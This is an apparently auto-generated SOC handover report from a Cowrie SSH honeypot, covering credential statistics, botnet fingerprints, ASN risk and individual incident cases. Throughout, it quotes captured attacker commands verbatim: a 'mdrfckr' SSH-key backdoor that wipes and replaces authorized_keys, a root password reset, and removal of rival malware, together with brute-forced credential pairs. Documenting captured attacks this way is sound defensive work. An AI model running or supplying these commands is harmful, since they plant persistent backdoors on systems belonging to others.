# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-22 |
| **Generated At** | 2026-05-22T19:53:34Z |
| **Shift Time** | 19:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **98** |
| Confirmed Threats | **56** |
| False Positives Filtered | **42** (42.9%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **10** |
| High Severity Cases | **25** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **73** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **51** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **16** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `345gs5662d34` | 12 |
| `vpn` | 1 |
| `dell` | 1 |
| `debian` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `12345678` | 1 |
| `123` | 1 |
| `test123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `vpn` | `12345678` | 1 |
| `dell` | `123` | 1 |
| `debian` | `test123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `11111111` | `103.158.40.65` | 2026-05-22T18:55:33 |
| `root` | `3245gs5662d34` | `103.158.40.65` | 2026-05-22T18:55:34 |
| `root` | `Azerty123@` | `197.248.207.139` | 2026-05-22T18:57:13 |
| `root` | `3245gs5662d34` | `197.248.207.139` | 2026-05-22T18:57:18 |
| `root` | `Y4k1nm4suk.2019` | `103.158.40.65` | 2026-05-22T19:07:44 |
| `root` | `Li123456.` | `103.158.40.65` | 2026-05-22T19:12:03 |
| `root` | `abcd1234..` | `103.158.40.65` | 2026-05-22T19:16:17 |
| `root` | `vps` | `197.248.207.139` | 2026-05-22T19:19:09 |
| `root` | `Qazwsxedc123` | `103.158.40.65` | 2026-05-22T19:20:30 |
| `root` | `admin2026` | `103.158.40.65` | 2026-05-22T19:24:48 |
| `root` | `LeitboGi0ro` | `197.248.207.139` | 2026-05-22T19:27:34 |
| `root` | `ASD123asd` | `197.248.207.139` | 2026-05-22T19:31:45 |
| `root` | `123456Lh` | `118.122.147.49` | 2026-05-22T19:34:48 |
| `root` | `li123456.` | `197.248.207.139` | 2026-05-22T19:36:08 |
| `root` | `Server@2019` | `197.248.207.139` | 2026-05-22T19:44:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **98** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 51 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 51 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 51 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:DRxYZe5HSXFf"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.122.147.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.248.207.139`, `103.158.40.65`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **11** |
| High-Risk ASNs | **4** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS13194` | Bite IP Network | 1 | LOW |
| `AS142647` | Nasstec Airnet Networks Private Limited | 1 | MEDIUM |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS38283` | CHINANET SiChuan Telecom Internet Data Center | 1 | HIGH |
| `AS37061` | Safaricom Limited | 1 | HIGH |
| `AS141319` | Net Hub | 1 | HIGH |
| `AS37492` | Orange Tunisie | 1 | LOW |
| `AS263717` | SOL TELECOMUNICACIONES S.A. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (25)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6389208706a0

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 18:55 |
| **Last Seen** | 2026-05-22 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 18:55:32` | `cowrie.session.connect` |
| `2026-05-22 18:55:32` | `cowrie.client.version` |
| `2026-05-22 18:55:32` | `cowrie.client.kex` |
| `2026-05-22 18:55:33` | `cowrie.login.success` |
| `2026-05-22 18:55:33` | `cowrie.session.params` |
| `2026-05-22 18:55:33` | `cowrie.command.input` |
| `2026-05-22 18:55:33` | `cowrie.command.failed` |
| `2026-05-22 18:55:33` | `cowrie.log.closed` |
| `2026-05-22 18:55:33` | `cowrie.session.params` |
| `2026-05-22 18:55:33` | `cowrie.command.input` |
| `2026-05-22 18:55:33` | `cowrie.session.file_download` |
| `2026-05-22 18:55:33` | `cowrie.log.closed` |
| `2026-05-22 18:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561c7ba83cef

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 18:55 |
| **Last Seen** | 2026-05-22 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 18:55:34` | `cowrie.session.connect` |
| `2026-05-22 18:55:34` | `cowrie.client.version` |
| `2026-05-22 18:55:34` | `cowrie.client.kex` |
| `2026-05-22 18:55:34` | `cowrie.login.success` |
| `2026-05-22 18:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8b38e62b4d5

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 18:57 |
| **Last Seen** | 2026-05-22 18:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 18:57:12` | `cowrie.session.connect` |
| `2026-05-22 18:57:12` | `cowrie.client.version` |
| `2026-05-22 18:57:13` | `cowrie.client.kex` |
| `2026-05-22 18:57:13` | `cowrie.login.success` |
| `2026-05-22 18:57:14` | `cowrie.session.params` |
| `2026-05-22 18:57:14` | `cowrie.command.input` |
| `2026-05-22 18:57:14` | `cowrie.command.failed` |
| `2026-05-22 18:57:14` | `cowrie.log.closed` |
| `2026-05-22 18:57:14` | `cowrie.session.params` |
| `2026-05-22 18:57:14` | `cowrie.command.input` |
| `2026-05-22 18:57:15` | `cowrie.session.file_download` |
| `2026-05-22 18:57:15` | `cowrie.log.closed` |
| `2026-05-22 18:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44091676e94

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 18:57 |
| **Last Seen** | 2026-05-22 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 18:57:17` | `cowrie.session.connect` |
| `2026-05-22 18:57:17` | `cowrie.client.version` |
| `2026-05-22 18:57:18` | `cowrie.client.kex` |
| `2026-05-22 18:57:18` | `cowrie.login.success` |
| `2026-05-22 18:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f807b0ef818

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:07 |
| **Last Seen** | 2026-05-22 19:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:07:43` | `cowrie.session.connect` |
| `2026-05-22 19:07:43` | `cowrie.client.version` |
| `2026-05-22 19:07:43` | `cowrie.client.kex` |
| `2026-05-22 19:07:44` | `cowrie.login.success` |
| `2026-05-22 19:07:44` | `cowrie.session.params` |
| `2026-05-22 19:07:44` | `cowrie.command.input` |
| `2026-05-22 19:07:44` | `cowrie.command.failed` |
| `2026-05-22 19:07:44` | `cowrie.log.closed` |
| `2026-05-22 19:07:44` | `cowrie.session.params` |
| `2026-05-22 19:07:44` | `cowrie.command.input` |
| `2026-05-22 19:07:44` | `cowrie.session.file_download` |
| `2026-05-22 19:07:44` | `cowrie.log.closed` |
| `2026-05-22 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daffe8d833f2

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:07 |
| **Last Seen** | 2026-05-22 19:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:07:46` | `cowrie.session.connect` |
| `2026-05-22 19:07:46` | `cowrie.client.version` |
| `2026-05-22 19:07:46` | `cowrie.client.kex` |
| `2026-05-22 19:07:46` | `cowrie.login.success` |
| `2026-05-22 19:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e9ed40cc6a2

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:12 |
| **Last Seen** | 2026-05-22 19:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:12:03` | `cowrie.session.connect` |
| `2026-05-22 19:12:03` | `cowrie.client.version` |
| `2026-05-22 19:12:03` | `cowrie.client.kex` |
| `2026-05-22 19:12:03` | `cowrie.login.success` |
| `2026-05-22 19:12:03` | `cowrie.session.params` |
| `2026-05-22 19:12:03` | `cowrie.command.input` |
| `2026-05-22 19:12:03` | `cowrie.command.failed` |
| `2026-05-22 19:12:04` | `cowrie.log.closed` |
| `2026-05-22 19:12:04` | `cowrie.session.params` |
| `2026-05-22 19:12:04` | `cowrie.command.input` |
| `2026-05-22 19:12:04` | `cowrie.session.file_download` |
| `2026-05-22 19:12:04` | `cowrie.log.closed` |
| `2026-05-22 19:12:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3caeba54699c

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:12 |
| **Last Seen** | 2026-05-22 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:12:05` | `cowrie.session.connect` |
| `2026-05-22 19:12:05` | `cowrie.client.version` |
| `2026-05-22 19:12:05` | `cowrie.client.kex` |
| `2026-05-22 19:12:06` | `cowrie.login.success` |
| `2026-05-22 19:12:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c4ce107d7a

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:16 |
| **Last Seen** | 2026-05-22 19:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:16:17` | `cowrie.session.connect` |
| `2026-05-22 19:16:17` | `cowrie.client.version` |
| `2026-05-22 19:16:17` | `cowrie.client.kex` |
| `2026-05-22 19:16:17` | `cowrie.login.success` |
| `2026-05-22 19:16:17` | `cowrie.session.params` |
| `2026-05-22 19:16:17` | `cowrie.command.input` |
| `2026-05-22 19:16:17` | `cowrie.command.failed` |
| `2026-05-22 19:16:18` | `cowrie.log.closed` |
| `2026-05-22 19:16:18` | `cowrie.session.params` |
| `2026-05-22 19:16:18` | `cowrie.command.input` |
| `2026-05-22 19:16:18` | `cowrie.session.file_download` |
| `2026-05-22 19:16:18` | `cowrie.log.closed` |
| `2026-05-22 19:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac359d0b17f0

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:16 |
| **Last Seen** | 2026-05-22 19:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:16:20` | `cowrie.session.connect` |
| `2026-05-22 19:16:20` | `cowrie.client.version` |
| `2026-05-22 19:16:20` | `cowrie.client.kex` |
| `2026-05-22 19:16:21` | `cowrie.login.success` |
| `2026-05-22 19:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2013774c81

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:19 |
| **Last Seen** | 2026-05-22 19:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:19:08` | `cowrie.session.connect` |
| `2026-05-22 19:19:08` | `cowrie.client.version` |
| `2026-05-22 19:19:08` | `cowrie.client.kex` |
| `2026-05-22 19:19:09` | `cowrie.login.success` |
| `2026-05-22 19:19:10` | `cowrie.session.params` |
| `2026-05-22 19:19:10` | `cowrie.command.input` |
| `2026-05-22 19:19:10` | `cowrie.command.failed` |
| `2026-05-22 19:19:10` | `cowrie.log.closed` |
| `2026-05-22 19:19:10` | `cowrie.session.params` |
| `2026-05-22 19:19:10` | `cowrie.command.input` |
| `2026-05-22 19:19:10` | `cowrie.session.file_download` |
| `2026-05-22 19:19:10` | `cowrie.log.closed` |
| `2026-05-22 19:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-362cedce6701

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:19 |
| **Last Seen** | 2026-05-22 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:19:13` | `cowrie.session.connect` |
| `2026-05-22 19:19:13` | `cowrie.client.version` |
| `2026-05-22 19:19:13` | `cowrie.client.kex` |
| `2026-05-22 19:19:14` | `cowrie.login.success` |
| `2026-05-22 19:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6742209ec08

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:20 |
| **Last Seen** | 2026-05-22 19:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
